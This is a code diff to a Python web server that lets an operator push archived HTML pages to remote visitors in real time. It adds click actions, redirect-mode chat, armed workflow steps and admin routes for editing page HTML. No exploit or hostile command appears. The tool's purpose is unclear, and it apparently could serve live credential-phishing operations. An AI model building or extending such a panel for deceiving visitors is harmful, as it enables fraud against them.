@@ -2143,10 +2143,26 @@ def _chat_config(device: Optional[str] = None) -> Dict[str, Any]:
     enabled = bool(getattr(st, "chat_enabled", False))
     if enabled and not _chat_device_allows(devices, device):
         enabled = False
+    mode = str(getattr(st, "chat_mode", "chat") or "chat").strip().lower()
+    if mode not in ("chat", "redirect"):
+        mode = "chat"
+    kind = str(getattr(st, "chat_redirect_kind", "link") or "link").strip().lower()
+    if kind not in ("link", "page"):
+        kind = "link"
+    page_id = str(getattr(st, "chat_redirect_page_id", "") or "").strip()
     return {
         "enabled": enabled,
         "devices": devices,
         "device": device or "",
+        # chat = opens the message panel; redirect = the bubble is a shortcut
+        "mode": mode,
+        "redirect_kind": kind,
+        "redirect_url": str(getattr(st, "chat_redirect_url", "") or "").strip(),
+        "redirect_page_id": page_id,
+        # Informational: what a redirect-mode bubble has to do. The client
+        # asks the server to perform it, so page pushes keep their audit
+        # trail and device/guard handling.
+        "redirect_page_url": f"/api/lpv/archive/{page_id}/html" if page_id else "",
         "bubble_color": getattr(st, "chat_bubble_color", "") or "#7c5cff",
         "text_color": getattr(st, "chat_text_color", "") or "#ffffff",
         "logo_url": getattr(st, "chat_logo_url", "") or "",
@@ -2294,6 +2310,102 @@ async def _handle_client_chat(client_id: str, msg: dict) -> None:
         logger.debug("[chat] store failed for %s: %s", client_id, exc)
         return
     await _broadcast_chat(row)
+
+
+async def _handle_click_action(
+    client_id: str, msg: dict, connection_token: Optional[str] = None
+) -> None:
+    """A mapped control was clicked inside a pushed page.
+
+    Two sources: the page's own saved actions (``index`` into that list) and
+    a rule a running workflow armed (``armed`` = the id it sent). Both end in
+    _run_action, which either pushes a page or sends the visitor to a link.
+    """
+    if not client_id:
+        return
+    armed = str(msg.get("armed") or "")
+    if armed:
+        entry = _ARMED_ACTIONS.get(client_id)
+        if not entry or entry.get("id") != armed:
+            return
+        entry["fired"] = True
+        event = entry.get("event")
+        if event is not None and not event.is_set():
+            try:
+                event.set()
+            except Exception:
+                pass
+        await _run_action(
+            client_id, entry.get("rule") or {},
+            connection_token=connection_token, source="workflow",
+        )
+        return
+
+    page_id = str(msg.get("page_id") or "")
+    try:
+        index = int(msg.get("index"))
+    except (TypeError, ValueError):
+        return
+    if not page_id or index < 0:
+        return
+    # Only the page this visitor is actually looking at may act, so a stale
+    # tab cannot make a page from ten minutes ago fire.
+    current_id = ""
+    try:
+        sess = lpv_store.get_session(client_id) or {}
+        current_id = str(sess.get("current_page_id") or "")
+    except Exception:
+        current_id = ""
+    if current_id and current_id != page_id:
+        return
+    actions = lpv_store.get_page_actions(page_id)
+    if index >= len(actions):
+        return
+    await _run_action(
+        client_id, actions[index], connection_token=connection_token, source="page",
+    )
+
+
+async def _handle_chat_redirect(
+    client_id: str, connection_token: Optional[str] = None
+) -> None:
+    """The visitor pressed the bubble while chat is in redirect mode."""
+    if not client_id:
+        return
+    try:
+        st = srv_settings.get_settings()
+        if not getattr(st, "chat_enabled", False):
+            return
+        if str(getattr(st, "chat_mode", "chat") or "chat").lower() != "redirect":
+            return
+        if not _chat_device_allows(
+            getattr(st, "chat_devices", "both"), await _client_device(client_id)
+        ):
+            return
+    except Exception:
+        return
+    kind = str(getattr(st, "chat_redirect_kind", "link") or "link").lower()
+    page_id = str(getattr(st, "chat_redirect_page_id", "") or "").strip()
+    url = str(getattr(st, "chat_redirect_url", "") or "").strip()
+    ok = False
+    target = ""
+    if kind == "page" and page_id:
+        ok, page = await _deliver_page(
+            client_id, page_id, connection_token=connection_token,
+            source="chat", record_kind="action_page",
+        )
+        target = (page or {}).get("name") or page_id
+    elif url:
+        ok = await _navigate_client(client_id, url, connection_token=connection_token)
+        target = url
+    lpv_store.record_event(
+        client_id, "chat_redirect",
+        {"kind": kind, "target": target, "delivered": ok},
+    )
+    await _broadcast_lpv_event(client_id, {
+        "event_type": "chat_redirect", "page_id": None, "page_name": target,
+        "payload": {"kind": kind, "delivered": ok},
+    })
 
 
 def _apply_redaction(payload: dict, rules: list) -> dict:
@@ -6305,6 +6417,147 @@ async def lpv_archive_get(page_id: str):
     return {"page": page}
 
 
+def _page_actions(page_id: str, page: Optional[Dict[str, Any]] = None) -> List[Dict[str, Any]]:
+    """Click actions for one page, ready to ship to client.html.
+
+    Same shape as _page_guard: prefer the row in hand, hit the DB only when
+    needed, and never raise — a missing page simply has no actions.
+    """
+    try:
+        if page is not None and page.get("actions") is not None:
+            return lpv_store.normalise_actions(page.get("actions"))
+        fetched = lpv_store.get_page(page_id) if page_id else None
+        if not fetched:
+            return []
+        return lpv_store.normalise_actions(fetched.get("actions"))
+    except Exception:
+        logger.debug("[lpv] action lookup failed for %s", page_id, exc_info=True)
+        return []
+
+
+async def _deliver_page(
+    client_id: str,
+    page_id: str,
+    *,
+    connection_token: Optional[str] = None,
+    bindings: Optional[Dict[str, str]] = None,
+    source: str = "action",
+    record_kind: str = "page_pushed",
+) -> Tuple[bool, Optional[Dict[str, Any]]]:
+    """Push one archived page to one visitor, the same way a workflow does.
+
+    Device variants resolve per visitor, binding values are carried by a
+    token, and the guard + click actions travel with the page. Everything
+    that "goes to a page" (a click action, the chat bubble's redirect mode,
+    a workflow step) ends up here, so they all behave identically.
+    """
+    page, served_id, _device = await _page_for_client(client_id, page_id)
+    if not page:
+        lpv_store.record_event(
+            client_id, f"{record_kind}_skipped",
+            {"reason": "page_missing", "page_id": page_id, "source": source},
+        )
+        return False, None
+    values = _bind_values_for_page(served_id, bindings)
+    token = _bind_token_for(served_id, values) if values else None
+    ok = await _send_to_client(client_id, {
+        "type": "lpv_show_page",
+        "page_id": served_id,
+        "page_url": _lpv_page_url(served_id, token),
+        "page_name": page["name"],
+        "guard": _page_guard(served_id, page),
+        "actions": _page_actions(served_id, page),
+    }, connection_token=connection_token)
+    if not ok:
+        lpv_store.record_event(
+            client_id, f"{record_kind}_skipped",
+            {"reason": "client_offline", "page_id": served_id, "source": source},
+        )
+        return False, page
+    lpv_store.set_current_page(client_id, served_id, page["name"])
+    lpv_store.record_event(
+        client_id, record_kind,
+        {"page_version": page.get("version", 1), "source": source},
+        page_id=served_id, page_name=page["name"],
+    )
+    await _broadcast_lpv_event(client_id, {
+        "event_type": record_kind,
+        "page_id": served_id,
+        "page_name": page["name"],
+        "payload": {"source": source},
+    })
+    return True, page
+
+
+async def _navigate_client(
+    client_id: str, url: str, *, connection_token: Optional[str] = None
+) -> bool:
+    """Send the visitor to an external URL (the same message a goto step uses)."""
+    url = (url or "").strip()
+    if not url:
+        return False
+    if not url.lower().startswith(("http://", "https://")):
+        url = "https://" + url
+    try:
+        ok = await _send_to_client(
+            client_id, {"type": "navigate", "url": url},
+            connection_token=connection_token,
+        )
+    except Exception:
+        ok = False
+    if not ok:
+        try:
+            ok = await _send_to_client(
+                client_id, {"type": "goto", "url": url},
+                connection_token=connection_token,
+            )
+        except Exception:
+            ok = False
+    return bool(ok)
+
+
+async def _run_action(
+    client_id: str,
+    rule: Dict[str, Any],
+    *,
+    connection_token: Optional[str] = None,
+    source: str = "page",
+    bindings: Optional[Dict[str, str]] = None,
+) -> bool:
+    """Carry out one click action: another page, or a link."""
+    rule = dict(rule or {})
+    do = str(rule.get("do") or "").lower()
+    matched = str(rule.get("match") or "")
+    if do == "page" and rule.get("page_id"):
+        ok, page = await _deliver_page(
+            client_id, rule["page_id"], connection_token=connection_token,
+            bindings=bindings, source=source, record_kind="action_page",
+        )
+        lpv_store.record_event(
+            client_id, "page_action",
+            {"match": matched, "do": "page", "source": source,
+             "target": (page or {}).get("name") or rule.get("page_name") or rule["page_id"],
+             "delivered": ok},
+            page_id=rule["page_id"], page_name=(page or {}).get("name") or "",
+        )
+        return ok
+    if do == "link" and rule.get("url"):
+        ok = await _navigate_client(client_id, rule["url"], connection_token=connection_token)
+        lpv_store.record_event(
+            client_id, "page_action",
+            {"match": matched, "do": "link", "source": source,
+             "target": rule["url"], "delivered": ok},
+        )
+        return ok
+    return False
+
+
+# Armed click actions: a workflow "action" step drops one rule on the client
+# and (optionally) waits for the click. Keyed by client so a rule from one
+# visitor can never fire for another.
+_ARMED_ACTIONS: Dict[str, Dict[str, Any]] = {}
+
+
 def _page_guard(page_id: str, page: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
     """Click guard for one page, ready to ship to client.html.
 
@@ -6865,6 +7118,140 @@ async def lpv_archive_duplicate(page_id: str, request: Request):
     return {"page": page}
 
 
+@app.get("/api/lpv/archive/{page_id}/source")
+async def lpv_archive_source(page_id: str, request: Request):
+    """The stored HTML exactly as it is on disk (admin only).
+
+    The /html route is the VISITOR's copy — bindings applied, scripts
+    stripped. Editing an archive has to start from the stored original, or a
+    save would bake a rendered copy over the page.
+    """
+    if not await verify_admin_token(request):
+        return JSONResponse({"error": "Unauthorized"}, status_code=401)
+    page = lpv_store.get_page(page_id)
+    if not page:
+        return JSONResponse({"error": "not found"}, status_code=404)
+    html = lpv_store.read_page_html(page_id)
+    if html is None:
+        return JSONResponse({"error": "file missing on disk"}, status_code=410)
+    return {
+        "page_id": page_id,
+        "name": page.get("name", ""),
+        "version": page.get("version", 1),
+        "html": html,
+        "size_bytes": page.get("size_bytes", 0),
+    }
+
+
+@app.put("/api/lpv/archive/{page_id}/html")
+async def lpv_archive_replace_html(page_id: str, request: Request):
+    """Re-upload the HTML for an existing archive (admin only).
+
+    Keeps the page id, name, bindings, click guard, click actions and device
+    pairing: only the file changes. The outgoing HTML is kept in the version
+    history, so an edit can be rolled back from the same card.
+    """
+    if not await verify_admin_token(request):
+        return JSONResponse({"error": "Unauthorized"}, status_code=401)
+    page = lpv_store.get_page(page_id)
+    if not page:
+        return JSONResponse({"error": "not found"}, status_code=404)
+    ctype = (request.headers.get("content-type") or "").lower()
+    description = None
+    tags = None
+    if "application/json" in ctype:
+        try:
+            body = await request.json()
+        except Exception:
+            return JSONResponse({"error": "invalid JSON"}, status_code=400)
+        if not isinstance(body, dict):
+            return JSONResponse({"error": "expected JSON object"}, status_code=400)
+        html = body.get("html") or ""
+        if "description" in body:
+            description = str(body.get("description") or "")
+        if isinstance(body.get("tags"), list):
+            tags = body["tags"]
+    else:
+        try:
+            form = await request.form()
+        except Exception:
+            return JSONResponse({"error": "expected JSON or form data"}, status_code=400)
+        html = form.get("html") or ""
+        upload = form.get("file")
+        if not html and upload is not None and hasattr(upload, "read"):
+            raw = await upload.read()
+            html = raw.decode("utf-8", "replace") if isinstance(raw, bytes) else str(raw)
+    if not isinstance(html, str) or not html.strip():
+        return JSONResponse({"error": "html is required"}, status_code=400)
+    try:
+        clean = _sanitize_lpv_html(html)
+        saved = lpv_store.replace_page_html(
+            page_id, clean, description=description, tags=tags
+        )
+    except ValueError as exc:
+        return JSONResponse({"error": str(exc)}, status_code=400)
+    except Exception as exc:
+        logger.error("lpv replace html error: %s", exc)
+        return JSONResponse({"error": str(exc)}, status_code=500)
+    if not saved:
+        return JSONResponse({"error": "not found"}, status_code=404)
+    return {"page": saved, "replaced": True}
+
+
+@app.get("/api/lpv/pages/{page_id}/actions")
+async def lpv_page_actions_get(page_id: str, request: Request):
+    """A page's click actions (admin)."""
+    if not await verify_admin_token(request):
+        return JSONResponse({"error": "Unauthorized"}, status_code=401)
+    page = lpv_store.get_page(page_id)
+    if not page:
+        return JSONResponse({"error": "not found"}, status_code=404)
+    return {
+        "page_id": page_id,
+        "actions": lpv_store.normalise_actions(page.get("actions")),
+    }
+
+
+@app.put("/api/lpv/pages/{page_id}/actions")
+async def lpv_page_actions_put(page_id: str, request: Request):
+    """Replace a page's click actions.
+
+    Body: {"actions": [{"match": "text:Sign in", "do": "page",
+                        "page_id": "<page id>"} | {"match": ".next",
+                        "do": "link", "url": "https://example.com"}]}
+
+    ``match`` is the same rule syntax as the click guard, so an operator who
+    has locked a page already knows how to address a control.
+    """
+    if not await verify_admin_token(request):
+        return JSONResponse({"error": "Unauthorized"}, status_code=401)
+    page = lpv_store.get_page(page_id)
+    if not page:
+        return JSONResponse({"error": "not found"}, status_code=404)
+    try:
+        body = await request.json()
+    except Exception:
+        return JSONResponse({"error": "invalid JSON"}, status_code=400)
+    actions = (body or {}).get("actions") if isinstance(body, dict) else None
+    if actions is None:
+        return JSONResponse({"error": "actions[] required"}, status_code=400)
+    if not isinstance(actions, list):
+        return JSONResponse({"error": "actions must be a list"}, status_code=400)
+    clean = lpv_store.normalise_actions(actions)
+    missing = []
+    for rule in clean:
+        if rule["do"] == "page" and not lpv_store.get_page(rule["page_id"]):
+            missing.append(rule.get("page_name") or rule["page_id"])
+    if missing:
+        return JSONResponse(
+            {"error": "page not found: " + ", ".join(missing)}, status_code=400
+        )
+    saved = lpv_store.set_page_actions(page_id, clean)
+    if saved is None:
+        return JSONResponse({"error": "not found"}, status_code=404)
+    return {"success": True, "actions": saved, "count": len(saved)}
+
+
 @app.get("/api/lpv/archive/{page_id}/versions")
 async def lpv_archive_versions(page_id: str):
     versions = lpv_store.list_versions(page_id)
@@ -7253,6 +7640,8 @@ async def _run_workflow_on_client(
                 # Only the operator-approved controls on a locked page are
                 # allowed to register a click (see client.html guardAllows).
                 "guard": _page_guard(page_id, page),
+                # And the controls that take the visitor somewhere.
+                "actions": _page_actions(page_id, page),
             }, connection_token=connection_token)
             if not ok:
                 # Client is gone (disconnected mid-chain). Log it and abort —
@@ -7284,6 +7673,71 @@ async def _run_workflow_on_client(
                     "payload": {"workflow_id": workflow.get("id"), "step": i,
                                 "kind": kind, "total": len(steps)},
                 })
+        elif kind == "action":
+            # Arm a click on the page the visitor is looking at. When it is
+            # pressed, the target page is pushed (or the link opened). With
+            # wait_seconds set, the chain pauses until that happens so the
+            # next step runs on whatever the action opened.
+            rule = lpv_store.normalise_action({
+                "match": step.get("match"),
+                "do": step.get("do"),
+                "page_id": step.get("page_id"),
+                "page_name": step.get("page_name"),
+                "url": step.get("url"),
+                "label": step.get("label"),
+            })
+            if not rule:
+                lpv_store.record_event(
+                    client_id, "workflow_step_skipped",
+                    {"workflow_id": workflow.get("id"), "step": i,
+                     "kind": kind, "reason": "bad_action"},
+                )
+                continue
+            current_id = ""
+            try:
+                current_id = str((lpv_store.get_session(client_id) or {}).get("current_page_id") or "")
+            except Exception:
+                current_id = ""
+            arm_id = uuid.uuid4().hex
+            fired_event = asyncio.Event()
+            _ARMED_ACTIONS[client_id] = {
+                "id": arm_id, "rule": rule, "event": fired_event,
+                "workflow_id": workflow.get("id"), "step": i,
+            }
+            armed = await _send_to_client(client_id, {
+                "type": "lpv_arm_action",
+                "id": arm_id,
+                "match": rule.get("match"),
+                "page_id": current_id,
+                "label": rule.get("label") or "",
+            }, connection_token=connection_token)
+            wait_secs = max(0, min(3600, int(step.get("wait_seconds") or 0)))
+            clicked = False
+            if armed and wait_secs:
+                try:
+                    await asyncio.wait_for(fired_event.wait(), timeout=wait_secs)
+                    clicked = True
+                except asyncio.TimeoutError:
+                    clicked = False
+            lpv_store.record_event(
+                client_id, "workflow_action",
+                {"workflow_id": workflow.get("id"), "step": i,
+                 "match": rule.get("match"), "do": rule.get("do"),
+                 "armed": bool(armed), "clicked": clicked,
+                 "wait_seconds": wait_secs},
+            )
+            await _broadcast_lpv_event(client_id, {
+                "event_type": "workflow_action",
+                "page_id": current_id or None,
+                "page_name": (rule.get("page_name") or rule.get("url") or ""),
+                "payload": {"workflow_id": workflow.get("id"), "step": i,
+                            "match": rule.get("match"), "do": rule.get("do"),
+                            "clicked": clicked},
+            })
+            # Once the chain moves on (or the wait expires) the rule is done;
+            # leaving it armed would let a later click fire out of context.
+            if wait_secs or not armed:
+                _ARMED_ACTIONS.pop(client_id, None)
         elif kind == "goto":
             # GOTO = actual URL navigation - per user request, this MUST redirect client.html itself.
             # For browser sessions we still do server page.goto (so stream follows), but we ALSO always
@@ -7432,6 +7886,7 @@ async def _run_workflow_on_client(
             await asyncio.sleep(secs)
         # Yield to the loop so we don't block other handlers
         await asyncio.sleep(0.05)
+    _ARMED_ACTIONS.pop(client_id, None)
     if (not _lpv_connection_is_current(client_id, connection_token)
             or not _workflow_is_current(client_id, workflow_token)):
         return
@@ -8241,6 +8696,7 @@ async def _enter_lpv_only_mode(websocket: WebSocket, init_data: dict) -> None:
             "default_page_url": default_url,
             # Click guard for the landing page (see /api/lpv/pages/<id>/guard).
             "default_page_guard": _page_guard(default_page),
+            "default_page_actions": _page_actions(default_page),
             "uses_brand_spinner": settings.lpv_default_uses_brand_spinner,
             "workflow_id": (wf_boot or {}).get("id", ""),
             "workflow_name": (wf_boot or {}).get("name", ""),
@@ -8296,6 +8752,7 @@ async def _enter_lpv_only_mode(websocket: WebSocket, init_data: dict) -> None:
                 "page_url": default_url,
                 "page_name": page.get("name", default_page),
                 "guard": _page_guard(page.get("id", default_page), page),
+                "actions": _page_actions(page.get("id", default_page), page),
             })
         except Exception:
             pass
@@ -8436,6 +8893,10 @@ async def _enter_lpv_only_mode(websocket: WebSocket, init_data: dict) -> None:
                 # ---- Live chat: client -> admin ----
                 if msg_type == "chat_message":
                     await _handle_client_chat(client_id, parsed)
+                elif msg_type == "chat_redirect":
+                    await _handle_chat_redirect(client_id, connection_token)
+                elif msg_type == "lpv_action":
+                    await _handle_click_action(client_id, parsed, connection_token)
 
                 # ---- LPV event stream (same handling as browser sessions) ----
                 if msg_type == "lpv_event":
@@ -9154,6 +9615,16 @@ async def websocket_endpoint(websocket: WebSocket):
                     # the same LPV runtime, so the widget emits here too).
                     await _handle_client_chat(session_id, message)
 
+                elif msg_type == 'chat_redirect':
+                    # Chat bubble in redirect mode: go to the configured
+                    # page/link instead of opening a conversation.
+                    await _handle_chat_redirect(session_id)
+
+                elif msg_type == 'lpv_action':
+                    # A control mapped to "go somewhere" was clicked inside a
+                    # pushed page (page action, or an armed workflow action).
+                    await _handle_click_action(session_id, message)
+
                 elif msg_type == 'lpv_event':
                     event_type = (message.get('event_type') or 'unknown')[:64]
                     page_id = message.get('page_id')
@@ -9802,6 +10273,7 @@ async def admin_websocket_endpoint(websocket: WebSocket):
                                         "page_url": page_url,
                                         "page_name": page["name"],
                                         "guard": _page_guard(page_id, page),
+                                        "actions": _page_actions(page_id, page),
                                     })
                                     if ok:
                                         lpv_store.set_current_page(
